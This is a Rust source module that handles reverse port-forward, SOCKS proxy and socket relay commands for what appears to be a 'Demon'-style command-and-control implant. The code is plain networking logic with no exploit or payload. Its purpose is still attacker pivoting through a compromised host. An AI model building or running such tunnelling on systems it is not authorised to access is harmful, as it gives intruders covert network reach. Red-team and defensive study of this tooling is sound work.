//! Command handler methods for `SocketState`.
//!
//! This is a child module of `socket_state`, giving it access to `SocketState`'s
//! private fields. All methods here handle incoming `CommandSocket` subcommands.

use std::net::{Ipv4Addr, SocketAddrV4, TcpListener};

use red_cell_common::demon::{DemonSocketCommand, DemonSocketType};
use tracing::{info, warn};

use super::super::socket_io::{
    connect_socks_target, encode_port_forward_add, encode_socket_clear, encode_socket_connect,
    encode_socket_write_failure, encode_socks_proxy_add, encode_socks_proxy_clear,
    encode_socks_proxy_remove, encode_u32, parse_bytes_le, parse_u32_le, raw_socket_error,
    write_all_nonblocking,
};
use super::super::types::{ManagedSocket, ReversePortForward, ReversePortForwardMode, SocksProxy};
use super::{SocketError, SocketState};

impl SocketState {
    // ─── Reverse port forward handlers ──────────────────────────────────────

    pub(super) fn handle_rportfwd_add(
        &mut self,
        request_id: u32,
        rest: &[u8],
        mode: ReversePortForwardMode,
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let bind_addr = parse_u32_le(rest, &mut offset)?;
        let bind_port = parse_u32_le(rest, &mut offset)?;
        let forward_addr = parse_u32_le(rest, &mut offset)?;
        let forward_port = parse_u32_le(rest, &mut offset)?;

        let command = match mode {
            ReversePortForwardMode::Teamserver => DemonSocketCommand::ReversePortForwardAdd,
            ReversePortForwardMode::Local => DemonSocketCommand::ReversePortForwardAddLocal,
        };

        let listener_id = self.allocate_socket_id();
        let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);

        match TcpListener::bind(bind_socket) {
            Ok(listener) => {
                if let Err(e) = listener.set_nonblocking(true) {
                    warn!(error = %e, "failed to set listener non-blocking");
                    self.queue_response(
                        request_id,
                        encode_port_forward_add(
                            command,
                            false,
                            0,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    );
                    return Ok(());
                }
                let bound_port =
                    listener.local_addr().map(|addr| u32::from(addr.port())).unwrap_or(bind_port);
                info!(
                    listener_id,
                    bind_addr, bound_port, forward_addr, forward_port, "rportfwd added"
                );
                self.reverse_port_forwards.insert(
                    listener_id,
                    ReversePortForward {
                        listener,
                        mode,
                        bind_addr,
                        bind_port: bound_port,
                        forward_addr,
                        forward_port,
                    },
                );
                self.queue_response(
                    request_id,
                    encode_port_forward_add(
                        command,
                        true,
                        listener_id,
                        bind_addr,
                        bound_port,
                        forward_addr,
                        forward_port,
                    ),
                );
            }
            Err(e) => {
                warn!(error = %e, "failed to bind rportfwd listener");
                self.queue_response(
                    request_id,
                    encode_port_forward_add(
                        command,
                        false,
                        0,
                        bind_addr,
                        bind_port,
                        forward_addr,
                        forward_port,
                    ),
                );
            }
        }

        Ok(())
    }

    pub(super) fn handle_rportfwd_list(&mut self, request_id: u32) {
        let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardList));
        for (socket_id, listener) in &self.reverse_port_forwards {
            payload.extend_from_slice(&encode_u32(*socket_id));
            payload.extend_from_slice(&encode_u32(listener.bind_addr));
            payload.extend_from_slice(&encode_u32(listener.bind_port));
            payload.extend_from_slice(&encode_u32(listener.forward_addr));
            payload.extend_from_slice(&encode_u32(listener.forward_port));
        }
        self.queue_response(request_id, payload);
    }

    pub(super) fn handle_rportfwd_clear(&mut self, request_id: u32) {
        let listener_ids: Vec<u32> = self.reverse_port_forwards.keys().copied().collect();
        for listener_id in listener_ids {
            self.remove_reverse_port_forward(listener_id);
        }
        let client_ids: Vec<u32> = self
            .sockets
            .iter()
            .filter_map(|(id, s)| (s.socket_type == DemonSocketType::Client).then_some(*id))
            .collect();
        for client_id in client_ids {
            self.remove_socket(client_id);
        }
        self.queue_response(request_id, encode_socket_clear(true));
    }

    pub(super) fn handle_rportfwd_remove(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        if self.reverse_port_forwards.contains_key(&socket_id) {
            let callbacks_before = self.pending_responses.len();
            self.remove_reverse_port_forward(socket_id);
            // Overwrite the request_id on the callback generated by remove_reverse_port_forward
            if let Some(resp) = self.pending_responses.get_mut(callbacks_before) {
                resp.request_id = request_id;
            }
        }
        Ok(())
    }

    // ─── SOCKS proxy handlers ───────────────────────────────────────────────

    pub(super) fn handle_socks_proxy_add(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let bind_addr = parse_u32_le(rest, &mut offset)?;
        let bind_port = parse_u32_le(rest, &mut offset)?;

        let listener_id = self.allocate_socket_id();
        let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);

        match TcpListener::bind(bind_socket) {
            Ok(listener) => {
                if let Err(e) = listener.set_nonblocking(true) {
                    warn!(error = %e, "failed to set socks listener non-blocking");
                    self.queue_response(
                        request_id,
                        encode_socks_proxy_add(false, 0, bind_addr, bind_port),
                    );
                    return Ok(());
                }
                let bound_port =
                    listener.local_addr().map(|addr| u32::from(addr.port())).unwrap_or(bind_port);
                info!(listener_id, bind_addr, bound_port, "socks proxy added");
                self.socks_proxies
                    .insert(listener_id, SocksProxy { listener, bind_addr, bind_port: bound_port });
                self.queue_response(
                    request_id,
                    encode_socks_proxy_add(true, listener_id, bind_addr, bound_port),
                );
            }
            Err(e) => {
                warn!(error = %e, "failed to bind socks proxy");
                self.queue_response(
                    request_id,
                    encode_socks_proxy_add(false, 0, bind_addr, bind_port),
                );
            }
        }

        Ok(())
    }

    pub(super) fn handle_socks_proxy_list(&mut self, request_id: u32) {
        let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyList));
        for (socket_id, proxy) in &self.socks_proxies {
            payload.extend_from_slice(&encode_u32(*socket_id));
            payload.extend_from_slice(&encode_u32(proxy.bind_addr));
            payload.extend_from_slice(&encode_u32(proxy.bind_port));
        }
        self.queue_response(request_id, payload);
    }

    pub(super) fn handle_socks_proxy_remove(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        if self.socks_proxies.remove(&socket_id).is_some() {
            let client_ids: Vec<u32> = self
                .socks_clients
                .iter()
                .filter_map(|(id, c)| (c.server_id == socket_id).then_some(*id))
                .collect();
            for client_id in client_ids {
                self.socks_clients.remove(&client_id);
            }
            self.queue_response(request_id, encode_socks_proxy_remove(socket_id));
        }
        Ok(())
    }

    pub(super) fn handle_socks_proxy_clear(&mut self, request_id: u32) {
        self.socks_proxies.clear();
        self.socks_clients.clear();
        self.queue_response(request_id, encode_socks_proxy_clear(true));
    }

    // ─── Socket I/O handlers ────────────────────────────────────────────────

    pub(super) fn handle_socket_read(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        let socket_type_raw = parse_u32_le(rest, &mut offset)?;
        let socket_type = DemonSocketType::try_from(socket_type_raw)
            .map_err(|_| SocketError::Parse("unknown socket type"))?;
        let success = parse_u32_le(rest, &mut offset)? != 0;

        if success {
            let data = parse_bytes_le(rest, &mut offset)?;
            self.write_to_socket(request_id, socket_id, socket_type, &data)?;
        } else {
            let error_code = parse_u32_le(rest, &mut offset)?;
            warn!(socket_id, error_code, "socket read failed (from server)");
        }

        Ok(())
    }

    pub(super) fn handle_socket_write(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        let data = parse_bytes_le(rest, &mut offset)?;

        let mut write_failure = None;
        if let Some(socket) = self.sockets.get_mut(&socket_id) {
            if let Err(error) = write_all_nonblocking(&mut socket.stream, &data) {
                write_failure = Some((socket.socket_type, raw_socket_error(&error)));
            }
        }
        if let Some((socket_type, error_code)) = write_failure {
            self.queue_response(
                request_id,
                encode_socket_write_failure(socket_id, socket_type, error_code),
            );
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    pub(super) fn handle_socket_close(&mut self, rest: &[u8]) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        self.remove_socket(socket_id);
        Ok(())
    }

    pub(super) async fn handle_socket_connect(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;

        // atyp is a single byte
        if rest.len() <= offset {
            return Err(SocketError::Parse("buffer too short for atyp"));
        }
        let atyp = rest[offset];
        offset += 1;

        let host = parse_bytes_le(rest, &mut offset)?;

        // port is i16 LE
        if rest.len() < offset + 2 {
            return Err(SocketError::Parse("buffer too short for port"));
        }
        let port_bytes: [u8; 2] = rest[offset..offset + 2]
            .try_into()
            .map_err(|_| SocketError::Parse("port conversion failed"))?;
        let port = u16::from_le_bytes(port_bytes);

        match connect_socks_target(atyp, &host, port).await {
            Ok(stream) => {
                self.sockets.insert(
                    socket_id,
                    ManagedSocket {
                        stream,
                        socket_type: DemonSocketType::ReverseProxy,
                        bind_addr: 0,
                        bind_port: u32::from(port),
                        forward_addr: 0,
                        forward_port: 0,
                    },
                );
                self.queue_response(request_id, encode_socket_connect(true, socket_id, 0));
            }
            Err(error_code) => {
                self.queue_response(
                    request_id,
                    encode_socket_connect(false, socket_id, error_code),
                );
            }
        }

        Ok(())
    }

    // ─── Internal helpers ───────────────────────────────────────────────────

    fn write_to_socket(
        &mut self,
        request_id: u32,
        socket_id: u32,
        expected_type: DemonSocketType,
        data: &[u8],
    ) -> Result<(), SocketError> {
        let Some(socket) = self.sockets.get_mut(&socket_id) else {
            warn!(socket_id, "socket not found for write");
            return Ok(());
        };

        let socket_type = socket.socket_type;
        if socket_type != expected_type {
            warn!(socket_id, ?socket_type, ?expected_type, "socket type mismatch");
            return Ok(());
        }

        if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
            let error_code = raw_socket_error(&error);
            self.queue_response(
                request_id,
                encode_socket_write_failure(socket_id, socket_type, error_code),
            );
            self.remove_socket(socket_id);
        }

        Ok(())
    }
}
